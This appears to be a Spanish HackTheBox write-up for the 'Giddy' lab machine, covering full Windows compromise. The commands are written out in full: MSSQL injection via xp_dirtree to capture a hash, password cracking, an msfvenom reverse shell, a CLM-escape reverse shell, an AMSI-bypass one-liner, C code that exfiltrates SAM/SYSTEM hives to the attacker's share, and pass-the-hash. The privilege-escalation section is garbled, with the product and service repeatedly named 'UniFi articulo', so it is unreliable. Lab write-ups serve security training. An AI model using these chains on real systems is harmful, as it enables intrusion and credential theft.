@@ -1,0 +1,447 @@
+---
+layout: post
+title: Giddy
+date: 2023-02-07
+description:
+img:
+fig-caption:
+tags: [eWPT, OSCP, OSWE]
+---
+___
+
+<center><img src="/writeups/assets/img/Giddy-htb/Giddy_banner.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Inyección SQL (Abuso de xp_dirtree)
+
+* Bypass AMSI (Scripting en C)
+
+* Dumpeo de SAM
+
+* Abuso de Servicio
+
+* PassTheHash
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.104 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-08 09:33 GMT
+Nmap scan report for 10.10.10.104
+Host is up (0.20s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+80/tcp   open  http
+443/tcp  open  https
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+
+Nmap done: 1 IP address (1 host up) scanned in 27.84 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p80,443,3389,5985 10.10.10.104 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-08 09:34 GMT
+Nmap scan report for 10.10.10.104
+Host is up (0.071s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+|_ssl-date: 2023-02-08T09:34:51+00:00; -1s from scanner time.
+|_http-title: IIS Windows Server
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
+| Not valid before: 2018-06-16T21:28:55
+|_Not valid after:  2018-09-14T21:28:55
+|_http-server-header: Microsoft-IIS/10.0
+| tls-alpn: 
+|   h2
+|_  http/1.1
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=Giddy
+| Not valid before: 2023-02-07T09:20:27
+|_Not valid after:  2023-08-09T09:20:27
+|_ssl-date: 2023-02-08T09:34:52+00:00; 0s from scanner time.
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.00 seconds
+```
+
+## Puerto 80 (HTTP) | Puerto 443 (HTTPS)
+
+Con whatweb, analizo las tecnologías que utiliza el servidor web
+
+```null
+whatweb http://10.10.10.104
+http://10.10.10.104 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.104], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
+
+whatweb https://10.10.10.104
+https://10.10.10.104 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.104], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
+```
+
+En base a los CN, no encuentro ningún dominio ni subdominio
+
+```null
+openssl s_client -connect 10.10.10.104:443 | grep CN
+Can't use SSL_get_servername
+depth=0 CN = PowerShellWebAccessTestWebSite
+verify error:num=18:self-signed certificate
+verify return:1
+depth=0 CN = PowerShellWebAccessTestWebSite
+verify error:num=10:certificate has expired
+notAfter=Sep 14 21:28:55 2018 GMT
+verify return:1
+depth=0 CN = PowerShellWebAccessTestWebSite
+notAfter=Sep 14 21:28:55 2018 GMT
+verify return:1
+ 0 s:CN = PowerShellWebAccessTestWebSite
+   i:CN = PowerShellWebAccessTestWebSite
+subject=CN = PowerShellWebAccessTestWebSite
+issuer=CN = PowerShellWebAccessTestWebSite
+```
+
+La página principal tiene el siguiente aspecto
+
+<img src="/writeups/assets/img/Giddy-htb/1.png" alt="">
+
+Aplico fuzzing para descubrir rutas
+
+```null
+gobuster dir -u http://10.10.10.104/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x asp,aspx
+===============================================================
+Gobuster v3.4
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.104/
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.4
+[+] Extensions:              asp,aspx
+[+] Timeout:                 10s
+===============================================================
+2023/02/08 09:44:34 Starting gobuster in directory enumeration mode
+===============================================================
+/remote               (Status: 302) [Size: 157] [--> /Remote/default.aspx?ReturnUrl=%2fremote]
+/*checkout*.aspx      (Status: 400) [Size: 3420]
+/*checkout*           (Status: 400) [Size: 3420]
+/*docroot*.aspx       (Status: 400) [Size: 3420]
+/*docroot*            (Status: 400) [Size: 3420]
+/mvc                  (Status: 301) [Size: 147] [--> http://10.10.10.104/mvc/]
+/*.aspx               (Status: 400) [Size: 3420]
+/*                    (Status: 400) [Size: 3420]
+```
+
+Encuentra una ruta /remote y /mvc. La primera corresponde a un PowerShell Web Access, pero hasta que no consiga credenciales no me sirve de nada
+
+<img src="/writeups/assets/img/Giddy-htb/2.png" alt="">
+
+La segunda contiene lo siguiente:
+
+<img src="/writeups/assets/img/Giddy-htb/3.png" alt="">
+
+Me puedo registrar
+
+<img src="/writeups/assets/img/Giddy-htb/4.png" alt="">
+
+Se me asocian varias cookies
+
+<img src="/writeups/assets/img/Giddy-htb/5.png" alt="">
+
+El parámetro id en la URL es vulnerable a inyección SQL
+
+<img src="/writeups/assets/img/Giddy-htb/6.png" alt="">
+
+Como por detrás está MSSQL, en caso de que esté habilitada la función xp_dirtree, podría intentar cargar un recurso alojado de mi lado, y así interceptar un hash NetNTLMv2, que puedo tratar de crackear por fuerza bruta
+
+<img src="/writeups/assets/img/Giddy-htb/7.png" alt="">
+
+Introduzco la inyección en la URL
+
+```null
+http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1;EXEC%20MASTER.sys.xp_dirtree%20%27\\10.10.16.3\shared%27,%201,%201
+```
+
+Y recibo el hash
+
+```null
+smbserver.py shared $(pwd) -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.104,49712)
+[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
+[*] User GIDDY\Stacy authenticated successfully
+[*] Stacy::GIDDY:aaaaaaaaaaaaaaaa:2505d017d4926b0368e8a90028de8823:010100000000000000f3e411a53bd9016598cb7e2cf2c5c00000000001001000420071004800620073006a006200590003001000420071004800620073006a006200590002001000570066005a007000730052007300640004001000570066005a00700073005200730064000700080000f3e411a53bd90106000400020000000800300030000000000000000000000000300000bd9974ae3bbb1d17a820452007ae016601f0c3efe86ccae3fb99413e619ea4050a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003300000000000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:shared)
+```
+
+Lo rompo por fuerza bruta con john
+
+```null
+john -w:/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+xNnWo6272k7x     (Stacy)     
+1g 0:00:00:01 DONE (2023-02-08 10:08) 0.8620g/s 2318Kp/s 2318Kc/s 2318KC/s xamton..x9820x
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Gano acceso por wirnm
+
+```null
+evil-winrm -i 10.10.10.104 -u Stacy -p xNnWo6272k7x
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Stacy\Documents>
+```
+
+Puedo visualizar la primera flag
+
+```null
+*Evil-WinRM* PS C:\Users\Stacy\Desktop> type user.txt
+855b992c72a5a618fbf7fa04c494c865
+```
+
+# Escalada
+
+En su directorio personal de documentos, hay un archivo con contenido
+
+```null
+*Evil-WinRM* PS C:\Users\Stacy\Documents> type unifiarticulo
+stop
+```
+
+Busco exploits asociados a ese nombre
+
+```null
+searchsploit unifi articulo
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                 |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Ubiquiti Networks UniFi articulo Default - 'crossdomain.xml' Security Bypass                                                                                                      | php/webapps/39268.java
+Ubiquiti UniFi articulo 3.7.3 - Local Privilege Escalation                                                                                                                        | windows/local/43390.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+Examino el exploit para ver en que consiste
+
+```null
+5. VULNERABILITY DETAILS
+========================
+Ubiquiti UniFi articulo for Windows is installed to "C:\ProgramData\unifi-articulo\"
+by default and is also shipped with a service called "Ubiquiti UniFi articulo". Its
+executable "avService.exe" is placed in the same directory and also runs under
+the NT AUTHORITY/SYSTEM account.
+
+However the default permissions on the "C:\ProgramData\unifi-articulo" folder are
+inherited from "C:\ProgramData" and are not explicitly overridden, which allows
+all users, even unprivileged ones, to append and write files to the application
+directory
+
+c:\ProgramData>icacls unifi-articulo
+unifi-articulo NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+BUILTIN\Administrators:(I)(OI)(CI)(F)
+CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+BUILTIN\Users:(I)(OI)(CI)(RX)
+BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)
+
+Upon start and stop of the service, it tries to load and execute the file at
+"C:\ProgramData\unifi-articulo\taskkill.exe". However this file does not exist in
+the application directory by default at all.
+```
+
+Tengo capacidad de escritura en la ruta donde está instalado unifi-articulo. Al reiniciar el servicio se busca por un binario que no existe. El vector de escalada consiste en crear mi propio binario que se encargue enviarme una reverse shell a mi equipo
+
+Con msfvenom creo el payload
+
+```null
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 --platform windows -f exe -o taskkill.exe
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: taskkill.exe
+```
+
+Creo un servicio http con python y lo descargo en la máquina víctima. Al ejecutarlo para comprobar que está funcional, lo bloquea el AMSI
+
+```null
+*Evil-WinRM* PS C:\ProgramData\unifi-articulo> certutil.exe -f -split -urlcache http://10.10.16.3/taskkill.exe taskkill.exe
+****  Online  ****
+  000000  ...
+  01204a
+CertUtil: -URLCache command completed successfully.
+
+*Evil-WinRM* PS C:\ProgramData\unifi-articulo> .\taskkill.exe
+Program 'taskkill.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
++ .\taskkill.exe
++ ~~~~~~~~~~~~~~.
+At line:1 char:1
++ .\taskkill.exe
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+```
+
+Intento corromper la tarea, pero al estar en un CLM lo tengo más complicado. Utilizo [PsBypassCLM.exe](https://github.com/padovah4ck/PSByPassCLM) para escapar de este contexto
+
+```null
+*Evil-WinRM* PS C:\Temp> certutil.exe -f -split -urlcache http://10.10.16.3/PsBypassCLM.exe PsBypassCLM.exe
+****  Online  ****
+  0000  ...
+  8400
+CertUtil: -URLCache command completed successfully.
+
+*Evil-WinRM* PS C:\Temp> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.16.3 /rport=443 /U C:\Temp\PsBypassCLM.exe
+```
+
+En mi equipo recibo una nueva sesión de PowerShell con FullLanguage
+
+```null
+nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.104] 49731
+
+PS C:\Temp> $ExecutionContext.SessionState.LanguageMode
+FullLanguage
+PS C:\Temp> 
+```
+
+Intento corromper la tarea, pero no consigo nada
+
+```null
+PS C:\ProgramData\unifi-articulo> $a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
+PS C:\ProgramData\unifi-articulo> .\taskkill.exe
+ERROR: Program 'taskkill.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
++ .\taskkill.exe
++ ~~~~~~~~~~~~~~.
+
+PS C:\ProgramData\unifi-articulo> 
+```
+
+Pruebo a compilar un script en C desarrollado por mí, utilizando mingw-w64
+
+```null
+#include <stdlib.h>
+
+int main(){
+    system("reg save HKLM\\SAM sam.bak");
+    system("reg save HKLM\\SYSTEM system.bak");
+    system("copy .\\sam.bak \\\\10.10.16.3\\shared\\sam");
+    system("copy .\\system.bak \\\\10.10.16.3\\shared\\system");
+
+}
+```
+
+Compilo y lo descargo en la máquina víctima
+
+```null
+x86_64-w64-mingw32-gcc script.c -o taskkill.exe
+```
+
+Intento listar los servicios, pero no tengo acceso
+
+```null
+*Evil-WinRM* PS C:\ProgramData\unifi-articulo> sc.exe query
+[SC] OpenSCManager FAILED 5:
+
+Access is denied.
+```
+
+Una manera alternativa es listando los registros
+
+```null
+*Evil-WinRM* PS C:\ProgramData\unifi-articulo> reg query HKLM\SYSTEM\CurrentControlSet\Services | Select-String unifi
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UniFiarticuloservice
+```
+
+Reinicio el servicio y recibo en mi equipo la SAM y el SYSTEM
+
+```null
+*Evil-WinRM* PS C:\ProgramData\unifi-articulo> cmd /c sc stop UniFiarticuloservice
+
+SERVICE_NAME: UniFiarticuloservice
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x2
+        WAIT_HINT          : 0xbb8
+```
+
+Con secretsdump, extraigo los hashes NT
+
+```null
+ecretsdump.py -sam sam -system system LOCAL
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0x3e47810e03c93fd0466514a8d379f9b5
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:550a4c946e4e52f0bc45da440fbeca75:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Stacy:1000:aad3b435b51404eeaad3b435b51404ee:3113971d67b1180a3d58c668cf02c949:::
+[*] Cleaning up... 
+```
+
+Con evil-winrm hago PassTheHash y puedo visualizar la segunda flag
+
+```null
+evil-winrm -i 10.10.10.104 -u Administrator -H 550a4c946e4e52f0bc45da440fbeca75
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+giddy\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
+69933945fded319225903446dd25f3ba
+```
